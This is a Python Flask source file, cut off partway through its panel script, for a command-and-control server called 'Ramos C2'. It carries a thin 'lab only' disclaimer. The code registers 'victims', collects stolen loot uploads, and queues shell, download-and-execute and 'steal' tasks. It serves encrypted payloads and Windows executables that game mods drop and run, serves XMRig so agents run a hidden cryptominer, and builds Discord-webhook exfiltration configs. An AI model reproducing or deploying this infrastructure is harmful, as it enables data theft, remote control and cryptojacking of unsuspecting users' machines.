"""Ramos C2 + SaaS panel — lab intake, victim registry, tasking, XMRig control.
Authorized lab research only. Run on YOUR VPS, test only against boxes you own.

Miner: open-source XMRig (https://github.com/xmrig/xmrig, GPL).
This repo does NOT vendor XMRig source — the panel serves an official
XMRig Windows build you placed next to this file as xmrig.exe, plus a
generated config.json. Start/stop is task-driven and reversible.
"""
import os, json, datetime, re, base64, zlib, uuid as _uuid
from functools import wraps
from flask import Flask, request, jsonify, send_from_directory, Response

app = Flask(__name__)
HERE = os.path.dirname(os.path.abspath(__file__))
LOOT = os.path.join(HERE, "loot")
os.makedirs(LOOT, exist_ok=True)
RES = os.path.join(LOOT, "results")
os.makedirs(RES, exist_ok=True)

VICTIMS_F = os.path.join(LOOT, "victims.json")
TASKS_F = os.path.join(LOOT, "tasks.json")
MINER_F = os.path.join(LOOT, "miner.json")
XMRIG_BIN = os.path.join(HERE, "xmrig.exe")

def log(msg):
    print(f"[{datetime.datetime.now().isoformat(timespec='seconds')}] {msg}", flush=True)

# ---- master key (SaaS login). No user accounts, one shared secret.
# Order: env MASTER_KEY / PANEL_MASTER_KEY, then /root/.ramos_panel_key file.
def load_master():
    for k in ("MASTER_KEY", "PANEL_MASTER_KEY"):
        v = os.environ.get(k, "").strip()
        if v:
            return v
    for p in ("/root/.ramos_panel_key", os.path.join(HERE, ".panel_key")):
        try:
            if os.path.isfile(p):
                v = open(p).read().strip().split()[0]
                if len(v) >= 8:
                    return v
        except Exception:
            pass
    return ""

MASTER = load_master()
if MASTER:
    log("panel: master key loaded (SaaS login enabled)")
else:
    log("panel: WARNING no master key found — /api/* returns 501 until MASTER_KEY is set")

def require_master(fn):
    @wraps(fn)
    def w(*a, **kw):
        if not MASTER:
            return jsonify({"status": "no-master-key"}), 501
        got = request.headers.get("X-Master-Key", "") or request.args.get("key", "")
        if not got.startswith("Bearer "):
            pass
        else:
            got = got[7:]
        if got != MASTER:
            return jsonify({"status": "forbidden"}), 403
        return fn(*a, **kw)
    return w

# ---- tiny json stores (no database, nothing else stored server-side)
def _load_json(path, default):
    try:
        if os.path.isfile(path):
            return json.load(open(path))
    except Exception:
        pass
    return default

def _save_json(path, obj):
    tmp = path + ".tmp"
    try:
        json.dump(obj, open(tmp, "w"), indent=1)
        os.replace(tmp, path)
    except Exception as e:
        log(f"save {path} failed: {e}")

def victims():
    return _load_json(VICTIMS_F, {})

def save_victims(v):
    _save_json(VICTIMS_F, v)

def tasks():
    return _load_json(TASKS_F, {})

def save_tasks(t):
    _save_json(TASKS_F, t)

def miner_defaults():
    d = _load_json(MINER_F, {})
    d.setdefault("pool", "")
    d.setdefault("wallet", "")
    d.setdefault("threads", 0)      # 0 = xmrig auto
    d.setdefault("cpu_max", 50)     # % hint 1-100
    d.setdefault("donate", 1)       # xmrig minimum
    return d

def touch_victim(vid, ip=None, sysinfo=None, counts=None, miner=None, extra=None):
    v = victims()
    e = v.get(vid, {"first_seen": datetime.datetime.now().isoformat(),
                    "beacons": 0})
    e["last_seen"] = datetime.datetime.now().isoformat()
    e["beacons"] = int(e.get("beacons", 0)) + 1
    if ip:
        e["ip"] = ip
    if sysinfo is not None:
        e["sysinfo"] = sysinfo
    if counts is not None:
        e["loot_counts"] = counts
        e["records"] = sum(counts.values()) if isinstance(counts, dict) else 0
    if miner is not None:
        e["miner"] = miner
    if extra:
        e.update(extra)
    v[vid] = e
    save_victims(v)
    return e

def queue_task(vid, ttype, args=None):
    t = tasks()
    tid = _uuid.uuid4().hex[:12]
    job = {"id": tid, "type": ttype, "args": args or {},
           "ts": datetime.datetime.now().isoformat(), "done": False}
    t.setdefault(vid, []).append(job)
    t[vid] = t[vid][-50:]  # cap per victim
    save_tasks(t)
    log(f"task {ttype} -> {vid} ({tid})")
    return job

def pop_tasks(vid):
    t = tasks()
    pending = [j for j in t.get(vid, []) if not j.get("done")]
    return pending

def mark_done(vid, tid, output=None):
    t = tasks()
    for j in t.get(vid, []):
        if j["id"] == tid:
            j["done"] = True
            j["done_ts"] = datetime.datetime.now().isoformat()
            if output is not None:
                j["output_tail"] = str(output)[:2000]
    save_tasks(t)
    if output is not None:
        try:
            vd = os.path.join(RES, re.sub(r"[^A-Za-z0-9_.-]", "_", vid)[:64])
            os.makedirs(vd, exist_ok=True)
            open(os.path.join(vd, tid + ".json"), "w").write(
                json.dumps({"ts": datetime.datetime.now().isoformat(),
                            "victim": vid, "task": tid,
                            "output": str(output)[:20000]}))
        except Exception:
            pass

def decode_loot_counts(data):
    """Best-effort decode of loot_b64 (zlib+json) -> {category: count} + sysinfo."""
    try:
        raw = data.get("loot_b64", "")
        if not raw:
            return None, None
        loot = json.loads(zlib.decompress(base64.b64decode(raw)).decode())
        counts = {k: len(v) for k, v in loot.items()} if isinstance(loot, dict) else None
        sysinfo = (loot.get("sysinfo") or [None])[0] if isinstance(loot, dict) else None
        return counts, sysinfo
    except Exception:
        return None, None

def backfill_victims():
    """Opt-in only (PANEL_BACKFILL=1): harvest existing shard_*.json tails so
    the panel shows history before boxes beacon again. Off by default —
    a clean panel stays at 0 until something actually runs."""
    if os.environ.get("PANEL_BACKFILL", "") != "1":
        log("panel: backfill off (PANEL_BACKFILL=1 to import shard history)")
        return
    try:
        if victims():
            return
        found = 0
        for fn in os.listdir(LOOT):
            if not (fn.startswith("shard_") and fn.endswith(".json")):
                continue
            vid = fn[len("shard_"):-len(".json")][:64]
            try:
                lines = open(os.path.join(LOOT, fn)).read().strip().split("\n")
                last = json.loads(lines[-1]) if lines and lines[0].strip() else {}
                data = last.get("data", {}) or {}
                counts, sysinfo = decode_loot_counts(data)
                touch_victim(vid, ip=last.get("ip"), sysinfo=sysinfo,
                             counts=counts)
                found += 1
            except Exception:
                continue
        if found:
            log(f"panel: backfilled {found} victims from shard history")
    except Exception as e:
        log(f"panel: backfill failed: {e}")

backfill_victims()

# ============================================================ intake (compat)
@app.route("/shard/prefireMc", methods=["POST"])
def prefire():
    data = request.get_json(force=True, silent=True) or {}
    prefire_id = os.urandom(8).hex()
    log(f"prefire from {request.remote_addr} user={data.get('userId')} session={str(data.get('sessionId'))[:16]}... -> {prefire_id}")
    return jsonify({"prefireId": prefire_id})

@app.route("/shard", methods=["GET", "POST"])
def shard():
    if request.method == "GET":
        return jsonify({"status": "ok"})
    data = request.get_json(force=True, silent=True) or {}
    uid = str(data.get("userId", "unknown"))[:64]
    log(f"shard_post from {uid} keys={list(data.keys())}")
    with open(os.path.join(LOOT, f"shard_{uid}.json"), "a") as f:
        f.write(json.dumps({"ts": datetime.datetime.now().isoformat(), "ip": request.remote_addr, "data": data}) + "\n")
    counts, sysinfo = decode_loot_counts(data)
    touch_victim(uid, ip=request.remote_addr, sysinfo=sysinfo, counts=counts)
    return jsonify({"status": "ok"})

@app.route("/submit", methods=["POST"])
def submit():
    uid = str(request.form.get("userId", "unknown"))[:64]
    for key, f in request.files.items():
        path = os.path.join(LOOT, f"{uid}_{key}_{f.filename}")
        f.save(path)
        log(f"loot {path} ({os.path.getsize(path)} bytes)")
    if request.is_json:
        data = request.get_json(silent=True) or {}
        with open(os.path.join(LOOT, f"loot_{uid}.json"), "a") as fh:
            fh.write(json.dumps(data) + "\n")
        log(f"json loot from {uid}: {list(data.keys())}")
    touch_victim(uid, ip=request.remote_addr)
    return jsonify({"status": "ok"})

@app.route("/shard/submitMinecraftLog", methods=["POST"])
def mc_log():
    data = request.get_json(force=True, silent=True) or {}
    uid = str(data.get("userId", "unknown"))[:64]
    with open(os.path.join(LOOT, f"mc_{uid}.log"), "a", encoding="utf-8", errors="replace") as f:
        f.write(f"\n===== {datetime.datetime.now().isoformat()} {request.remote_addr} =====\n")
        f.write(data.get("content", "")[:1_000_000])
    log(f"minecraft log from {uid} ({len(data.get('content',''))} bytes)")
    return jsonify({"status": "ok"})

@app.route("/loot/<path:name>", methods=["GET"])
@require_master
def get_loot(name):
    return send_from_directory(LOOT, name)

# ============================================================ agent (beacon+tasking)
@app.route("/agent/checkin", methods=["POST"])
def agent_checkin():
    """Persistent-agent beacon. {victim_id, sysinfo?, miner?} -> {tasks:[...]}."""
    data = request.get_json(force=True, silent=True) or {}
    vid = str(data.get("victim_id") or data.get("userId") or "unknown")[:64]
    miner = data.get("miner")
    sysinfo = data.get("sysinfo")
    counts = data.get("counts")
    touch_victim(vid, ip=request.remote_addr, sysinfo=sysinfo, counts=counts, miner=miner,
                 extra={"agent": True})
    pending = pop_tasks(vid)
    log(f"agent {vid} beacon miner={miner} tasks={len(pending)}")
    return jsonify({"status": "ok", "tasks": pending})

@app.route("/agent/result", methods=["POST"])
def agent_result():
    data = request.get_json(force=True, silent=True) or {}
    vid = str(data.get("victim_id") or data.get("userId") or "unknown")[:64]
    tid = str(data.get("task_id") or data.get("id") or "")[:32]
    out = data.get("output", "")
    mark_done(vid, tid, out)
    if isinstance(data.get("miner"), dict):
        touch_victim(vid, miner=data["miner"])
    log(f"agent {vid} result {tid} ({len(str(out))} bytes)")
    return jsonify({"status": "ok"})

# ============================================================ miner (open-source XMRig)
# Source: https://github.com/xmrig/xmrig (GPL). Panel serves an official
# Windows build placed here as xmrig.exe + a generated config.json.
# Agent downloads, runs hidden (no admin), stops on task. Reversible.
@app.route("/miner/xmrig.exe", methods=["GET"])
def miner_bin():
    if not os.path.isfile(XMRIG_BIN):
        return jsonify({"status": "no-miner"}), 404
    return send_from_directory(HERE, "xmrig.exe")

@app.route("/mod/tool", methods=["GET"])
def mod_tool():
    """Helper binaries for lab mods (e.g. ?name=chromelevator_x64.exe).
    Served over the pinned channel; mod drops them next to the payload."""
    import re as _re
    name = request.args.get("name", "")
    if not _re.match(r"^[A-Za-z0-9_.-]{1,64}$", name):
        return jsonify({"status": "bad-name"}), 400
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
    if not os.path.isfile(path):
        return jsonify({"status": "no-tool"}), 404
    return send_from_directory(os.path.dirname(path), name)

def build_xmrig_config(pool, wallet, threads=0, cpu_max=50, donate=1):
    cfg = {
        "api": {"id": None, "worker-id": None},
        "http": {"enabled": False},
        "autosave": False,
        "background": False,
        "colors": False,
        "donate-level": max(1, int(donate or 1)),
        "cpu": {
            "enabled": True,
            "huge-pages": False,
            "max-threads-hint": int(threads or 0) or 50,
            "max-cpu-usage": max(1, min(100, int(cpu_max or 50))),
        },
        "pools": [{"url": pool, "user": wallet, "keepalive": True, "tls": False}],
    }
    return cfg

@app.route("/miner/config", methods=["GET"])
def miner_config():
    """Per-victim xmrig config. Query may override stored defaults
    (operator preview uses master key; agent fetch is plain)."""
    d = miner_defaults()
    pool = request.args.get("pool", d["pool"])
    wallet = request.args.get("wallet", d["wallet"])
    try:
        threads = int(request.args.get("threads", d["threads"] or 0))
    except Exception:
        threads = 0
    try:
        cpu_max = int(request.args.get("cpu", d["cpu_max"] or 50))
    except Exception:
        cpu_max = 50
    if not pool or not wallet:
        return jsonify({"status": "no-miner-config",
                        "hint": "set pool+wallet via panel or ?pool=&wallet="}), 404
    return jsonify(build_xmrig_config(pool, wallet, threads, cpu_max, d.get("donate", 1)))

# ============================================================ SaaS API (master key)
@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.get_json(force=True, silent=True) or {}
    key = data.get("key", "") or request.headers.get("X-Master-Key", "")
    if MASTER and key == MASTER:
        return jsonify({"ok": True})
    return jsonify({"ok": False}), 403

@app.route("/api/victims", methods=["GET"])
@require_master
def api_victims():
    v = victims()
    rows = []
    for vid, e in sorted(v.items(), key=lambda kv: kv[1].get("last_seen", ""), reverse=True):
        rows.append({"id": vid, "last_seen": e.get("last_seen"),
                     "first_seen": e.get("first_seen"), "ip": e.get("ip"),
                     "sysinfo": e.get("sysinfo"), "loot_counts": e.get("loot_counts"),
                     "records": e.get("records", 0), "miner": e.get("miner"),
                     "beacons": e.get("beacons", 0), "agent": bool(e.get("agent"))})
    return jsonify({"victims": rows, "miner_defaults": miner_defaults(),
                    "xmrig_present": os.path.isfile(XMRIG_BIN)})

@app.route("/api/victim/<vid>", methods=["GET"])
@require_master
def api_victim(vid):
    v = victims().get(vid)
    if not v:
        return jsonify({"status": "no-victim"}), 404
    t = tasks().get(vid, [])
    # loot preview: last shard line, counts only (full files via /loot/)
    preview = None
    try:
        p = os.path.join(LOOT, f"shard_{vid}.json")
        if os.path.isfile(p):
            lines = open(p).read().strip().split("\n")
            last = json.loads(lines[-1]) if lines else {}
            preview = {"ts": last.get("ts"), "keys": list((last.get("data") or {}).keys())}
    except Exception:
        pass
    vd = os.path.join(RES, re.sub(r"[^A-Za-z0-9_.-]", "_", vid)[:64])
    results = []
    try:
        if os.path.isdir(vd):
            for fn in sorted(os.listdir(vd))[-20:]:
                try:
                    results.append(json.load(open(os.path.join(vd, fn))))
                except Exception:
                    pass
    except Exception:
        pass
    return jsonify({"victim": dict({"id": vid}, **v), "tasks": t[-20:],
                    "preview": preview, "results": results[-10:]})

@app.route("/api/task", methods=["POST"])
@require_master
def api_task():
    data = request.get_json(force=True, silent=True) or {}
    vid = str(data.get("victim_id", ""))[:64]
    ttype = str(data.get("type", ""))[:32]
    args = data.get("args", {}) or {}
    if not vid or ttype not in ("shell", "miner_start", "miner_stop",
                                "download_exec", "steal", "raw"):
        return jsonify({"status": "bad-task"}), 400
    # fill miner_start blanks from stored defaults
    if ttype == "miner_start":
        d = miner_defaults()
        args.setdefault("pool", d["pool"])
        args.setdefault("wallet", d["wallet"])
        args.setdefault("threads", d["threads"])
        args.setdefault("cpu", d["cpu_max"])
        if not args.get("pool") or not args.get("wallet"):
            return jsonify({"status": "no-miner-config",
                            "hint": "set pool+wallet first"}), 400
    job = queue_task(vid, ttype, args)
    return jsonify({"status": "queued", "task": job})

@app.route("/api/miner", methods=["GET", "POST"])
@require_master
def api_miner():
    if request.method == "GET":
        return jsonify(miner_defaults())
    data = request.get_json(force=True, silent=True) or {}
    # POST has two shapes: defaults update {pool,wallet,...} OR per-victim
    # action {victim_id, action: start|stop}.
    if data.get("victim_id") and data.get("action"):
        vid = str(data["victim_id"])[:64]
        act = data["action"]
        if act == "start":
            d = miner_defaults()
            args = {"pool": data.get("pool") or d["pool"],
                    "wallet": data.get("wallet") or d["wallet"],
                    "threads": data.get("threads", d["threads"]),
                    "cpu": data.get("cpu", d["cpu_max"])}
            if not args["pool"] or not args["wallet"]:
                return jsonify({"status": "no-miner-config"}), 400
            return jsonify({"status": "queued",
                            "task": queue_task(vid, "miner_start", args)})
        elif act == "stop":
            return jsonify({"status": "queued",
                            "task": queue_task(vid, "miner_stop", {})})
        return jsonify({"status": "bad-action"}), 400
    d = miner_defaults()
    for k in ("pool", "wallet", "threads", "cpu_max", "donate"):
        if k in data:
            d[k] = data[k]
    _save_json(MINER_F, d)
    return jsonify({"status": "saved", "miner": d})

# ============================================================ mod endpoints (compat)
PANEL_PAYLOAD = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payload.dat")

@app.route("/mod/fetch", methods=["GET"])
def mod_fetch():
    """Sealed Python payload for lab mods (packed by tools/make_payload.py:
    BH01 magic + iv(12) + tag(16) + ciphertext). Mod decrypts with panel key
    inside the pinned channel and runs it."""
    import base64 as _b
    if not os.path.isfile(PANEL_PAYLOAD):
        return jsonify({"status": "no-payload"}), 404
    blob = open(PANEL_PAYLOAD, "rb").read()
    if len(blob) < 32 or blob[:4] != b"BH01":
        return jsonify({"status": "bad-payload"}), 500
    return jsonify({"iv": _b.b64encode(blob[4:16]).decode(),
                    "tag": _b.b64encode(blob[16:32]).decode(),
                    "data": _b.b64encode(blob[32:]).decode()})

@app.route("/mod/submit", methods=["POST"])
def mod_submit():
    data = request.get_json(force=True, silent=True) or {}
    uid = str(data.get("userId", "unknown"))[:64] + "-modloot"
    with open(os.path.join(LOOT, f"modloot_{uid}.json"), "a") as fh:
        fh.write(json.dumps({"ts": datetime.datetime.now().isoformat(),
                             "ip": request.remote_addr, "size": len(str(data))}) + "\n")
    log(f"mod loot from {uid}")
    return jsonify({"status": "ok"})

@app.route("/mod/exe", methods=["GET"])
def mod_exe():
    """Standalone Windows payload (no python needed on the box).
    Served over the pinned channel; mod drops and executes it."""
    name = request.args.get("name", "vw_webhook.exe")
    if not re.match(r"^[A-Za-z0-9_.-]{1,64}$", name):
        return jsonify({"status": "bad-name"}), 400
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
    if not os.path.isfile(path):
        return jsonify({"status": "no-exe"}), 404
    return send_from_directory(os.path.dirname(path), name)

@app.route("/mod/cfg", methods=["GET"])
def mod_cfg():
    """Operator-specific sealed config for staged loaders.
    ?w=<webhook> -> ENC1-sealed bh_config.bin the payload honors at runtime."""

    w = request.args.get("w", "")
    name = request.args.get("name", "bh_config.bin")
    if not re.match(r"^[A-Za-z0-9_.-]{1,64}$", name):
        return jsonify({"status": "bad-name"}), 400
    raw_cfg = b""
    if w:
        if not re.match(r"^https://discord\.com/api/webhooks/[0-9]{5,30}/[A-Za-z0-9_-]{10,120}$", w):
            return jsonify({"status": "bad-webhook"}), 400
        raw_cfg = ("kind=webhook\ntarget=%s\n" % w).encode()
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
    if raw_cfg:
        k = os.urandom(16)
        x = bytes(b ^ k[i % 16] for i, b in enumerate(raw_cfg))
        return (b"ENC1" + k + x, 200, {"Content-Type": "application/octet-stream"})
    if not os.path.isfile(path):
        return jsonify({"status": "no-cfg"}), 404
    return send_from_directory(os.path.dirname(path), name)

@app.route("/mod/checkin", methods=["POST"])
def mod_checkin():
    """Pinned-TLS lab-mod check-in. Body is an AES-GCM envelope
    {key, iv, data} (base64); key unwrap happens inside the pinned channel.
    Lab operators: replace TODO key handling with your KMS of choice."""
    import base64 as _b
    from Crypto.Cipher import AES as _AES
    data = request.get_json(force=True, silent=True) or {}
    try:
        key = _b.b64decode(data["key"])
        iv = _b.b64decode(data["iv"])
        ct = _b.b64decode(data["data"])
        pt = _AES.new(key, _AES.MODE_GCM, iv).decrypt(ct)[:-16]
        inner = json.loads(pt.decode())
        uid = str(inner.get("user", "unknown"))[:64] + "-mod"
        with open(os.path.join(LOOT, f"mod_{uid}.json"), "a") as fh:
            fh.write(json.dumps({"ts": datetime.datetime.now().isoformat(),
                                 "ip": request.remote_addr, "data": inner}) + "\n")
        touch_victim(uid, ip=request.remote_addr,
                     extra={"mod_user": inner.get("user"), "uuid": inner.get("uuid")})
        log(f"mod check-in from {uid} uuid={inner.get('uuid')}")
        return jsonify({"status": "ok"})
    except Exception as e:
        log(f"mod check-in failed: {str(e)[:80]}")
        return jsonify({"status": "error"}), 400

# ============================================================ SaaS panel UI
PANEL_HTML = """<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Ramos C2 — panel</title>
<style>
:root{
  --bg:#07070b; --panel:#0d0d14; --panel2:#12121c; --line:#1c1c2e;
  --txt:#e8e6f5; --dim:#6a6788; --acc:#8030f0; --acc2:#a259ff;
  --grn:#2ed573; --red:#ff4757; --cyn:#00d9ff; --warn:#ffa502;
}
*{box-sizing:border-box;margin:0;padding:0}
body{
  background:var(--bg);color:var(--txt);min-height:100vh;
  font-family:"JetBrains Mono","Fira Code",ui-monospace,Menlo,Consolas,monospace;
}
#bg{position:fixed;inset:0;z-index:0;pointer-events:none;
  background:radial-gradient(800px 480px at 50% -15%,rgba(128,48,240,.16),transparent 60%),
             radial-gradient(600px 420px at 90% 110%,rgba(0,217,255,.05),transparent 55%)}
#grid{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.3;
  background-image:linear-gradient(rgba(128,48,240,.05) 1px,transparent 1px),
                   linear-gradient(90deg,rgba(128,48,240,.05) 1px,transparent 1px);
  background-size:46px 46px;animation:drift 28s linear infinite}
@keyframes drift{to{background-position:46px 46px,46px 46px}}
.wrap{position:relative;z-index:1;max-width:1100px;margin:0 auto;padding:30px 20px 60px}
@keyframes rise{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
.r{opacity:0;animation:rise .55s cubic-bezier(.2,.8,.2,1) forwards}

h1{font-size:26px;font-weight:800;letter-spacing:-1px;
  background:linear-gradient(90deg,#c9a5ff,#8030f0 45%,#5ee0ff);
  -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
h2{font-size:12px;color:var(--dim);text-transform:uppercase;letter-spacing:1px;
  margin:26px 0 10px;padding-bottom:7px;border-bottom:1px solid var(--line)}
.dim{color:var(--dim)} .small{font-size:11px}
.ok{color:var(--grn)} .bad{color:var(--red)} .cy{color:var(--cyn)}

.card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:18px;
  position:relative;overflow:hidden;transition:border .25s,box-shadow .25s}
.card::before{content:"";position:absolute;top:0;left:0;right:0;height:1px;
  background:linear-gradient(90deg,transparent,var(--acc),transparent)}
.card:hover{border-color:rgba(128,48,240,.5);box-shadow:0 8px 34px rgba(0,0,0,.4)}

.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
input,select{background:#05050a;border:1px solid var(--line);color:var(--txt);
  border-radius:10px;padding:12px 14px;font-family:inherit;font-size:13px;outline:none;
  transition:border .2s,box-shadow .2s}
input:focus,select:focus{border-color:var(--acc);box-shadow:0 0 0 3px rgba(128,48,240,.18)}
input::placeholder{color:#3a3760}
button{display:inline-flex;align-items:center;gap:7px;padding:11px 20px;border-radius:10px;
  font-size:12.5px;font-weight:700;font-family:inherit;cursor:pointer;border:none;
  transition:transform .15s,filter .15s,box-shadow .15s,background .15s}
button:active{transform:scale(.96)}
button:disabled{opacity:.45;cursor:not-allowed;transform:none!important}
.btn{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff;
  box-shadow:0 4px 16px rgba(128,48,240,.35)}
.btn:hover{filter:brightness(1.12);transform:translateY(-1px)}
.ghost{background:transparent;border:1px solid var(--line);color:var(--txt)}
.ghost:hover{background:rgba(128,48,240,.1);border-color:var(--acc)}
.danger{background:transparent;border:1px solid #4a1f26;color:var(--red)}
.danger:hover{background:rgba(255,71,87,.12);border-color:var(--red)}
.mini{padding:7px 13px;font-size:11.5px;border-radius:8px}

table{border-collapse:collapse;width:100%;font-size:12.5px}
td,th{border-bottom:1px solid var(--line);padding:9px 10px;text-align:left}
th{color:var(--dim);font-size:10.5px;text-transform:uppercase;letter-spacing:.8px}
tr.vrow{cursor:pointer;transition:background .15s}
tr.vrow:hover{background:rgba(128,48,240,.07)}
tr.vrow.sel{background:rgba(128,48,240,.13)}

.pill{display:inline-block;padding:3px 11px;border-radius:11px;font-size:10.5px;font-weight:700}
.on{background:#12331f;color:var(--grn);box-shadow:0 0 10px rgba(46,213,115,.25)}
.off{background:#2a1519;color:var(--red)}
.dot{width:8px;height:8px;border-radius:50%;background:var(--grn);display:inline-block;
  box-shadow:0 0 10px var(--grn);animation:pulse 2s infinite}
@keyframes pulse{50%{opacity:.35}}

pre{background:#05050a;border:1px solid var(--line);padding:13px;border-radius:10px;
  overflow:auto;max-height:320px;font-size:11.5px;line-height:1.6;white-space:pre-wrap;
  word-break:break-all;color:#9aa0b4}
code{color:var(--cyn)}

#loginView{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.login-card{width:100%;max-width:400px;text-align:center;padding:34px 28px;
  animation:rise .5s cubic-bezier(.2,.8,.2,1) both}
.login-card h1{font-size:30px;margin-bottom:6px}
.login-card form{display:flex;flex-direction:column;gap:11px;margin-top:20px}
.login-card input{width:100%;text-align:center;font-size:14px}
.login-card button{justify-content:center;padding:13px}
#lerr{min-height:18px;font-size:12px;margin-top:10px}
#toast{position:fixed;bottom:24px;left:50%;transform:translate(-50%,90px);z-index:50;
  background:var(--panel2);border:1px solid var(--acc);color:var(--txt);padding:12px 22px;
  border-radius:11px;font-size:13px;opacity:0;pointer-events:none;max-width:90vw;
  transition:transform .35s cubic-bezier(.2,.9,.3,1.2),opacity .35s;
  box-shadow:0 10px 40px rgba(0,0,0,.5)}
#toast.show{transform:translate(-50%,0);opacity:1}
#toast.err{border-color:var(--red)}
.hint{font-size:11px;color:var(--dim);margin-top:9px;line-height:1.6}
label{display:block;font-size:10.5px;font-weight:700;color:var(--dim);margin-bottom:6px;
  text-transform:uppercase;letter-spacing:.6px}
.field{flex:1;min-width:150px}
.sw{display:flex;align-items:center;gap:10px;cursor:pointer;font-size:12px;color:var(--txt);
  user-select:none;margin-top:12px}
.sw input{appearance:none;width:42px;height:23px;background:var(--line);border-radius:12px;
  position:relative;transition:.25s;cursor:pointer;flex:none;padding:0}
.sw input::before{content:"";position:absolute;top:2px;left:2px;width:19px;height:19px;
  background:#fff;border-radius:50%;transition:.25s cubic-bezier(.4,1.4,.5,1)}
.sw input:checked{background:linear-gradient(135deg,var(--acc),var(--acc2))}
.sw input:checked::before{transform:translateX(19px)}
#appHead{display:flex;justify-content:space-between;align-items:flex-end;gap:14px;
  flex-wrap:wrap;margin-bottom:6px}
.chip{font-size:11px;padding:6px 13px;border:1px solid var(--line);border-radius:20px;
  color:var(--dim);background:var(--panel2)}
.chip.warn{border-color:var(--warn);color:var(--warn)}
@media(max-width:640px){.wrap{padding:18px 13px}h1{font-size:21px}
  td,th{padding:7px 6px;font-size:11.5px}.hide-s{display:none}}
</style>
</head>
<body>
<div id=bg></div><div id=grid></div>

<div id=loginView>
  <div class="card login-card">
    <h1>RAMOS C2</h1>
    <p class="dim small"><span class="dot"></span>&nbsp; lab control panel</p>
    <form id=loginForm autocomplete=off>
      <input type=password id=key placeholder="master key" autocomplete=off spellcheck=false>
      <button type=submit class=btn id=unlockBtn>&#128273; UNLOCK</button>
    </form>
    <p id=lerr class=bad></p>
    <p class="dim small" style="margin-top:14px">miner: open-source
      <a href="https://github.com/xmrig/xmrig" target="_blank" rel="noopener"
         style="color:var(--cyn)">XMRig</a> · start / stop per victim · no accounts, one key</p>
  </div>
</div>

<div id=appView class=wrap style="display:none">
  <div id=appHead class=r">
    <div>
      <h1>RAMOS C2 <span class="dim" style="font-size:13px;-webkit-text-fill-color:var(--dim)">saas panel</span></h1>
      <p class="dim small" id=clock></p>
    </div>
    <div class=row>
      <span id=xmrig class=chip></span>
      <button class="ghost mini" id=refreshBtn>&#10227; REFRESH</button>
      <button class="danger mini" id=lockBtn>&#128274; LOCK</button>
    </div>
  </div>

  <div class="card r" style="animation-delay:.08s">
    <h2 style="margin-top:0">&#9878; miner defaults <span class="dim">(open-source XMRig)</span></h2>
    <div class=row>
      <div class=field><label>pool</label>
        <input id=mpool placeholder="gulf.moneroocean.stream:10128" style="width:100%"
               spellcheck=false></div>
      <div class=field><label>wallet</label>
        <input id=mwallet placeholder="XMR address" style="width:100%" spellcheck=false></div>
      <div class=field style="max-width:130px"><label>cpu %</label>
        <input id=mcpu placeholder="50" style="width:100%" spellcheck=false></div>
      <button class=btn id=saveMinerBtn style="align-self:flex-end">SAVE</button>
    </div>
    <p class=hint>applied when you hit START without overrides · xmrig.exe served from your
      panel · per-victim config.json · donate-level 1 (upstream min) · STOP kills it clean</p>
  </div>

  <div class="card r" style="animation-delay:.16s">
    <h2 style="margin-top:0">&#128187; victims <span class="dim" id=vcount></span></h2>
    <div style="overflow-x:auto">
      <table><thead><tr><th>victim</th><th>last seen</th><th class=hide-s>ip</th>
        <th>records</th><th>miner</th><th>ops</th></tr></thead>
        <tbody id=vt></tbody></table>
    </div>
  </div>

  <div class="card r" style="animation-delay:.24s">
    <h2 style="margin-top:0">&#128269; detail <span class="dim" id=detTitle>— pick a victim</span></h2>
    <div id=det class="dim small">click a row above to inspect loot counts, tasks, and results.</div>
  </div>

  <div class="card r" style="animation-delay:.32s">
    <h2 style="margin-top:0">&#9881;&#65039; task</h2>
    <div class=row>
      <div class=field><label>victim</label><input id=tv placeholder="victim id" style="width:100%"></div>
      <div class=field><label>type</label>
        <select id=tt style="width:100%;padding:12px 10px">
          <option value=shell>shell</option>
          <option value=miner_start>miner_start</option>
          <option value=miner_stop>miner_stop</option>
          <option value=download_exec>download_exec</option>
          <option value=steal>steal (re-run)</option>
        </select></div>
      <div class=field style="flex:2"><label>args (json)</label>
        <input id=ta placeholder='{"cmd":"whoami"}' style="width:100%" spellcheck=false></div>
      <button class=btn id=taskBtn style="align-self:flex-end">QUEUE</button>
    </div>
    <div id=tres style="margin-top:12px"></div>
  </div>
</div>

<div id=toast></div>

<script>
"use strict";
const $ = id => document.getElementById(id);
let K = localStorage.getItem("ramos_master") || "";
let selected = null, refreshing = false;
const H = () => ({"Content-Type":"application/json","X-Master-Key":K});
const esc = s => String(s == null ? "" : s).replace(/&/g,"&amp;").replace(/</g,"&lt;")
  .replace(/>/g,"&gt;").replace(/"/g,"&quot;");

function toast(msg, err){
  const t = $("toast");
  t.textContent = msg;
  t.className = err ? "show err" : "show";
  clearTimeout(t._t);
  t._t = setTimeout(() => t.className = "", 3000);
}

async function api(path, opts){
  opts = opts || {};
  opts.headers = H();
  const r = await fetch(path, opts);
  if (r.status === 403) throw new Error("key rejected");
  if (r.status === 501) throw new Error("panel has no master key set");
  if (!r.ok) {
    let m = "http " + r.status;
    try { const d = await r.json(); m = d.status || d.error || d.hint || m; } catch (e) {}
    throw new Error(m);
  }
  return r.json();
}

function showApp(){
  $("loginView").style.display = "none";
  $("appView").style.display = "block";
  load();
  if (!showApp._t) showApp._t = setInterval(() => { if (!document.hidden) load(true); }, 15000);
}

async function login(){
  const btn = $("unlockBtn"), err = $("lerr");
  K = $("key").value.trim();
  if (!K){ err.textContent = "paste the master key"; return; }
  btn.disabled = true; btn.textContent = "checking…"; err.textContent = "";
  try {
    await api("/api/login", {method:"POST", body:JSON.stringify({key:K})});
    localStorage.setItem("ramos_master", K);
    showApp();
    toast("unlocked — welcome back");
  } catch (e) {
    err.textContent = e.message === "key rejected" ? "wrong key — try again" : e.message;
